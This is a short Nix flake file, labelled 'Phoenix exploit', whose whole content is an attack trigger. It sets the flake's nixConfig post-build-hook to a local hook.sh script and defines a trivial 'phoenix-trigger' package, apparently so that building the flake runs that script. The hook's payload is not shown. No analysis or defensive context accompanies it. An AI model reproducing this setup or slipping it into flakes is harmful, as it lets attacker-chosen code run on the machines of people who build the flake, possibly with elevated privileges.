{
  description = "Phoenix exploit";

  inputs.nixpkgs.url = "github:NixOS/nixpkgs/release-25.05";

  nixConfig = {
    post-build-hook = builtins.toString ./hook.sh;
  };

  outputs = { nixpkgs, ... }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };
    in {
      packages.${system}.default =
        pkgs.runCommand "phoenix-trigger" {} ''
          touch $out
        '';
    };
}